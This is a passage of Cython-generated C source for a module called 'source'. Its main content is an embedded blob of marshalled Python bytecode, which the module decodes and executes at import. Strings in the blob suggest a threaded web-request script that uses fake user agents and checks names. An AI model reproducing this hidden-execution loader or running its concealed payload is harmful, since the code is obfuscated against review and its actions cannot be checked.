\330\033$\240[\324\0331\260\"\322\0334\320\0334\270\031\320CT\3249U\320VW\3229W\3209W\220&\220&\320\\c\200k\360\000\000[\002d\002\360\000\000e\002p\002\364\000\000[\002q""\002\360\000\000r\002t\002\362\000\000[\002t\002\360\000\000[\002t\002\360\000\000x\001X\002\360\000\000x\001X\002\360\000\000y\002{\002\320dv\360\000\014E\003\004\340$6\360\005\014E\003\004\360\000\014E\003\004\360\006\000\031\036\360\007\014E\003\004\360\000\014E\003\004\360\010\000\031\"\240'\324\030*\360\t\014E\003\004\360\000\014E\003\004\360\n\000)2\260+\324(>\360\013\014E\003\004\360\000\014E\003\004\360\014\000\025\036\320\0364\324\0245\360\r\014E\003\004\360\000\014E\003\004\360\016\000\031\"\320\"3\324\0304\360\017\014E\003\004\360\000\014E\003\004\360\020\000!*\320*;\324 <\360\021\014E\003\004\360\000\014E\003\004\360\022\000/8\270\n\324.C\360\023\014E\003\004\360\000\014E\003\004\360\000\014E\003\004\360\000\000|\002D\003\365\030\000\005\022\220(\321\004\033\324\004\033\320\004\033\325\0341\265%\275\007\300\010\321\034I\324\034I\320\034I\335\013\017\320\006\037\320\006\037\225\005\220e\220\014\220\014\224\014\230a\221\017\220\014\220\014\221\014\320\006\037\320\006\037\320\006\037\321\006\037\324\006\037\320\006\037\320\006\037\320\006\037\320\006\037\320\006\037\320\006\037\370\370\370\320\006\037\320\006\037\320\006\037\320\006\037\335\005\020\201]\204]\200]\200]\345\n\016\320\005\036\320\005\036\215u\220U\210|\210|\214|\230Q\211\210|\210|\211|\320\005\036\320\005\036\320\005\036\321\005\036\324\005\036\320\005\036\320\005\036\320\005\036\320\005\036\320\005\036\320\005\036\370\370\370\320\005\036\320\005\036\320\005\036\320\005\036\335\005\020\201]\204]\200]\370\370\335\t\022\320\002E\320\002E\320\002E\235\005\320\036D\300\021\320\036D\320\036D\321\030E\324\030E\320\030E\320\030E\320\030E\320\030E\320\030E\320\030E\370\370\370\370\320\002E\370\370\370\361=\036\002F\001s\253\000\000\000\203\026H\020\000\232\007H\020\000\241\026A\003\003\267\014H\020\000\301\003\004A\007\007\301\007\003H\020\000\301\n\001A\007\007\301\0133H\020\000\301>\026B \003\302\024\014H\020\000\302 \004B$\007\302$\003H\020\000\302'\001B$\007\302(C)H\020\000\306\021\026F3\003\306'""\014H\020\000\3063\004F7\007\3067\003H\020\000\306:\001F7\007\306;\031H\020\000\307\024\026G6\003\307*\014H\020\000\3076\004G:\007\307:\003H\020\000\307=\001G:\007\307>\021H\020\000\310\020\nH6\003\310\032\022H1\003\3101\005H6\003c\000\000\000\000\000\000\000\000\000\000\000\000\004\000\000\000\003\000\000\000\363\322\000\000\000\227\000d\001\204\000t\001\000\000\000\000\000\000\000\000\000\000d\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000D\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000}\000|\000D\000]\026}\001|\001\240\001\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000\214\027\t\000\214\001#\000t\004\000\000\000\000\000\000\000\000\000\000$\000r'\001\000t\007\000\000\000\000\000\000\000\000\000\000d\004\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000t\t\000\000\000\000\000\000\000\000\000\000j\005\000\000\000\000\000\000\000\000d\005\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000Y\000d\000S\000w\000x\003Y\000w\001)\006Nc\001\000\000\000\000\000\000\000\000\000\000\000\006\000\000\000\023\000\000\000\363D\000\000\000\227\000g\000|\000]\035}\001t\001\000\000\000\000\000\000\000\000\000\000j\001\000\000\000\000\000\000\000\000t\004\000\000\000\000\000\000\000\000\000\000d\000\254\001\246\002\000\000\253\002\000\000\000\000\000\000\000\000\221\002\214\036S\000)\002T)\002\332\006target\332\006daemon)\003\332\tthreading\332\006Threadr[\001\000\000)\002r,\000\000\000r\351\000\000\000s\002\000\000\000  r\023\000\000\000r.\000\000\000z\030main.<locals>.<listcomp>\337\000\000\000s(\000\000\000\200\000\320\tI\320\tI\320\tI\270\021\215)\324\n\032\245&\260\004\320\n5\321\n5\324\n5\320\tI\320\tI\320\tIr&\000\000\000r\226\000\000\000Tz+\nStopping script... Closing threads safely.r\001\000\000\000)\006\332\005range\332\005start\332\021KeyboardInterruptr\016\000\000\000r\013\000\000\000r\014\000\000\000)\002\332\007threads""\332\006threads\002\000\000\000  r\023\000\000\000\332\004mainrg\001\000\000\336\000\000\000sy\000\000\000\200\000\330\tI\320\tI\275e\300C\271j\274j\320\tI\321\tI\324\tI\200\027\330\017\026\320\001%\320\001%\200V\220v\227|\222|\221~\224~\220~\220~\360\002\002\002\\\001\330\002\021\370\335\010\031\320\001[\320\001[\320\001[\235%\320 N\321\032O\324\032O\320\032O\325PS\324PX\320YZ\321P[\324P[\320P[\320P[\320P[\320P[\320\001[\370\370\370s\017\000\000\000\264\0015\000\265-A&\003\301%\001A&\003)Dr\005\000\000\000r\013\000\000\000r\007\000\000\000r\024\000\000\000r\016\000\000\000r\001\001\000\000r\002\001\000\000r\000\001\000\000r\026\001\000\000r\003\001\000\000\332\007magenta\332\001Mr\377\000\000\000\332\006oranger\004\001\000\000r\r\001\000\000\332\005inputrV\001\000\000r\006\000\000\000r\020\000\000\000\332\020raise_for_statusr\010\000\000\000\332\nsplitlines\332\013valid_names\332\020RequestException\332\005_exitrU\001\000\000r \000\000\000r8\000\000\000r\262\000\000\000r=\000\000\000r;\000\000\000\332\016fake_useragentr\027\000\000\000r`\001\000\000r\264\000\000\000r6\000\000\000\332\007secretsr\030\000\000\000\332\003ms4r\031\000\000\000r\032\000\000\000r\365\000\000\000\332\005queuer\033\000\000\000r%\000\000\000r(\000\000\000\332\021variable_instancer\200\000\000\000r\275\000\000\000r\376\000\000\000\332\006colors\332\004Lockr\024\001\000\000r\025\001\000\000r\020\001\000\000r5\001\000\000rR\001\000\000r6\001\000\000r9\000\000\000rS\001\000\000r\031\001\000\000r \001\000\000r(\001\000\000r8\001\000\000rK\001\000\000r[\001\000\000rg\001\000\000r*\000\000\000r&\000\000\000r\023\000\000\000\372\010<module>rx\001\000\000\001\000\000\000s\343\004\000\000\360\003\001\001\001\330\000\017\200\017\200\017\200\017\330\000\n\200\n\200\n\200\n\340\010b\200\005\360\004\010\001\023\360\000\010\001\023\360\000\010\001\023\360\024\000\001\r\200\014\201\016\204\016\200\016\330\000\017\200\017\200\017\200\017\330\000\n\200\n\200\n\200\n\340\010P\200\005\360\004\t\001\023\360\000""\t\001\023\360\000\t\001\023\360\026\000\001\r\200\014\201\016\204\016\200\016\340\000\005\200\005\320\006&\321\000'\324\000'\320\000'\330\006\027\200\003\330\010\031\200\005\330\t\032\200\006\330\007\030\200\004\330\007\030\200\004\330\n\033\200\007\330\004\025\200\001\330\010\031\200\005\330\t \200\006\330\010\021\200\005\330\000\017\200\017\200\017\200\017\330\000\t\200\t\200\t\200\t\330\000\017\200\017\200\017\200\017\330\000\t\200\t\200\t\200\t\340\n\017\210%\2203\320\0200\320\0200\320\0200\321\n1\324\n1\200\007\360\004\006\001\020\330\017\033\210x\214|\320\034c\321\017d\324\017d\200H\330\004\014\327\004\035\322\004\035\321\004\037\324\004\037\320\004\037\330\022\032\224-\327\022*\322\022*\321\022,\324\022,\200K\200K\370\330\007\017\324\007 \360\000\002\001\020\360\000\002\001\020\360\000\002\001\020\330\004\t\200E\320\nQ\321\004R\324\004R\320\004R\330\004\014\200B\204H\210Q\201K\204K\200K\200K\200K\360\005\002\001\020\370\370\370\360\n\000\004\013\210k\320\003\031\320\003\031\330\004\t\200E\210,\321\004\027\324\004\027\320\004\027\320\004\027\340\004\t\200E\320\n\035\321\004\036\324\004\036\320\004\036\330\004\014\200B\204H\210Q\201K\204K\200K\330\006\013\200e\210u\320\0146\320\0146\320\0146\321\0067\324\0067\200\005\340\000\017\200\017\200\017\200\017\330\000\r\200\r\200\r\200\r\330\000\017\200\017\200\017\200\017\330\000\013\200\013\200\013\200\013\330\000\013\200\013\200\013\200\013\330\000\016\200\016\200\016\200\016\330\000$\320\000$\320\000$\320\000$\320\000$\320\000$\330\000\020\320\000\020\320\000\020\320\000\020\330\000\n\200\n\200\n\200\n\330\000\013\200\013\200\013\200\013\330\000\020\320\000\020\320\000\020\320\000\020\330\000\035\320\000\035\320\000\035\320\000\035\320\000\035\320\000\035\330\000 \320\000 \320\000 \320\000 \320\000 \320\000 \320\000 \320\000 \330\000\t\200\t\200\t\200\t\330\000\r\200\r\200\r\200\r\330\000\027\320\000\027\320\000\027\320\000\027\320\000\027\320\000\027\360\002\003\001\023\360\000\003\001\023\360\000\003\001\023""\360\010\000\001e\003\360\000\000\001e\003\360\000\000\001e\003\360\000\000\001e\003\360\000\000\001e\003\361\000\000\001e\003\364\000\000\001e\003\360\000\000\001e\003\330\022\032\220(\221*\224*\320\000\021\360\002\000\001n\023\360\000\000\001n\023\360\000\000\001n\023\360\002\030\001\024\360\000\030\001\024\360\000\030\001\024\3602\033\001\025\360\000\033\001\025\360\000\033\001\025\3608\000\021\033\240J\260Z\310\n\320Zd\320mv\320\007w\320\007w\200\006\330\005\023\200Y\204^\321\005\025\324\005\025\200\004\330\035\036\260\021\270\021\300\021\320\006C\320\006C\200\005\330\000>\320\000>\320\000>\330\000\014\200\014\201\016\204\016\200\016\360\002\002\001g\001\330\n\r\210#\210e\210e\220v\320\024R\320\024R\320\024R\321\016S\324\016S\321\nT\324\nT\200T\320UZ\370\330\010\022\320\001f\320\001f\320\001f\2205\2205\230F\2405\234M\320\031e\320\031e\320TZ\320[b\324Tc\320\031e\320\031e\321\023f\324\023f\320\023f\320\023f\320\023f\320\001f\370\370\370\360\005\002\001g\001\360\006\000\001\r\200\014\201\016\204\016\200\016\330\000\005\200\005\210\025\320\006^\320\006^\250\003\320\006^\320\006^\320\006^\321\000_\324\000_\320\000_\330\000\005\200\005\2103\320\006V\320\006V\240\005\320\006V\320\006V\320\006V\321\000W\324\000W\320\000W\330\007\014\200u\320\rI\321\007J\324\007J\200\006\330\000\014\200\014\201\016\204\016\200\016\330\003\t\2103\202;\200;\220l\210v\210v\330\005\013\210S\202[\200[\230\n\220\026\220\026\330\005\n\200U\320\013@\321\005A\324\005A\320\005A\310\034\300&\360\002\002\001f\006\360\000\002\001f\006\360\000\002\001f\006\360\006\002\001H\001\360\000\002\001H\001\360\000\002\001H\001\360\006\004\001G\001\360\000\004\001G\001\360\000\004\001G\001\360\n\016\001#\360\000\016\001#\360\000\016\001#\360\036\002\001\024\360\000\002\001\024\360\000\002\001\024\360\006\037\001F\001\360\000\037\001F\001\360\000\037\001F\001\360@\001\005\001\\\001\360\000\005\001\\\001\360\000\005\001\\\001\360\014\000\001\005\200\004\201\006\204\006\200\006\200\006\200\006s$\000\000\000\301-=B""+\000\302+%C\023\003\303\022\001C\023\003\306)\027G\001\000\307\001!G%\003\307$\001G%\003";
static PyObject *__pyx_n_s_builtins;
static PyObject *__pyx_kp_b_c_d_d_l_Z_d_d_l_Z_d_Z_d_Z_e_d_d;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_loads;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_marshal;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_tuple_;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},
  {&__pyx_kp_b_c_d_d_l_Z_d_d_l_Z_d_Z_d_Z_e_d_d, __pyx_k_c_d_d_l_Z_d_d_l_Z_d_Z_d_Z_e_d_d, sizeof(__pyx_k_c_d_d_l_Z_d_d_l_Z_d_Z_d_Z_e_d_d), 0, 0, 0, 0},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_loads, __pyx_k_loads, sizeof(__pyx_k_loads), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_marshal, __pyx_k_marshal, sizeof(__pyx_k_marshal), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  return 0;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_b_c_d_d_l_Z_d_d_l_Z_d_Z_d_Z_e_d_d); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_marshal, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_marshal, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_marshal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_loads); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyExecGlobals(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
